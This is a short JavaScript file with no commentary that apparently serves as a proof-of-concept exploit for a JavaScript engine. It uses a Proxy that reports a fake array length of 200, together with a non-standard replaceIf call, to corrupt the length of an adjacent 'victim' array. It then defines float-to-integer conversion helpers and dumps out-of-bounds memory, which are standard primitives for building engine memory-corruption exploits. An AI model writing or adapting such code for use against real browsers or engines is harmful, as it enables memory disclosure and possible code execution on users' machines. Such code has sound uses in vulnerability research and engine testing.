let small = [1.1];
let victim = [2.2, 3.3, 4.4, 5.5];
let ta = new Float64Array(8);
ta[0] = 1.234567;
let obj = {marker: 0x41414141};
let obj_arr = [obj, obj, obj, obj];
let handler = {
  get: function(target, prop, receiver) {
    if (prop === "length") return 200;
    return Reflect.get(target, prop, receiver);
  }
};
let p = new Proxy(small, handler);
function fromHex(h) {
  let buf = new ArrayBuffer(8);
  let f = new Float64Array(buf);
  let u = new BigUint64Array(buf);
  u[0] = h;
  return f[0];
}
function toHex(d) {
  let buf = new ArrayBuffer(8);
  let f = new Float64Array(buf);
  let u = new BigUint64Array(buf);
  f[0] = d;
  return "0x" + u[0].toString(16);
}
p.replaceIf(14, (x)=>{ return true; }, fromHex(0x1000n << 32n));
print("victim.length:", victim.length);
for (let i = 0; i < 200; i++) {
  let h = toHex(victim[i]);
  if (h !== "0x0" && h !== "0x7ff8000000000000") {
    print(i, h);
  }
}
